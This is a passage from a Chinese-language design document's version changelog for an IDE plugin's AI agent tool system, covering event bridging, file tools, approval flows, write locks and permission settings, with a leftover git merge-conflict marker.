| 12 | 新增路径规范统一说明 | 消除 `read_file`（相对路径）和 `run_command`（绝对路径）的歧义 |
| 13 | `permissionMode` 使用枚举类型而非 String | 防止拼写错误，编译期类型安全 |
| 14 | `deny_rules` 补充 `run_command` 路径检查说明 | 明确命令参数中的路径穿越也在 deny_rules 中拦截 |
| 15 | `BackgroundTask` 补充字段定义 | 消除未定义类型 |

>>>>>>> Stashed changes
### v2.0 → v3.0（适配统一事件通道 + 消息分组）

| # | 变更 | 原因 |
|---|------|------|
| 1 | Bridge 事件体系（第 9 节）完全重写 | Phase 1 已将 15 个独立回调统一为 `onEvent(type, payload)` 通道，新增事件走 `buildEventJS()` 生成，不再注册独立回调 |
| 2 | `bridge.d.ts` 变更从"新增回调接口"改为"新增动作方法" | Bridge 接口只有 `onEvent` + 动作方法，新事件仅新增 payload 类型定义，新审批响通过新增动作方法 |
| 3 | 新增第 9.6 节"前端 groupReducer 扩展" | Phase 2 用 `groupReducer` 替代 `eventReducer`，新事件需在 reducer 中新增 case |
| 4 | 文件变更清单（第 14 节）增加前端组件和 reducer | Phase 2 引入 `AssistantGroup`、`groupReducer` 等新文件，需在清单中反映 |
| 5 | 迁移步骤（第 15 节）拆分 Bridge 扩展和前端扩展为独立步骤 | Bridge 事件扩展（`buildEventJS`）和前端组件开发（groupReducer + 审批弹框）可独立验证 |

### v1.0 → v2.0（合并文档 + 优化设计）

| # | 变更 | 原因 |
|---|------|------|
| 1 | `grep_files` 底层改为 IntelliJ FindInProjectUtil 优先 | 外部 `rg` 在 Windows/部分 macOS 上不可用，IDE 插件不应依赖外部工具 |
| 2 | `read_file` 改用行号（`line_number` + `limit` 行数） | 字符偏移对 AI 不直观，行号是行业惯例 |
| 3 | 新增 `FileWriteLock` 文件级并发保护 | 多 tool_call 并发写同文件会丢失数据 |
| 4 | 审批挂起改用协程 `suspendCancellableCoroutine` | `CompletableFuture.get()` 阻塞线程，多审批并发时耗尽线程池 |
| 5 | 新建文件增加确认对话框 | 防止 AI 在任意位置静默创建文件 |
| 6 | MCP 工具默认需审批，新增 `trustedMcpServers` 配置 | 远程工具默认 WORKSPACE_WRITE 过于宽松 |
| 7 | 合并 protocol-design + architecture 为一份文档 | 两份文档 60% 重复，维护成本高 |
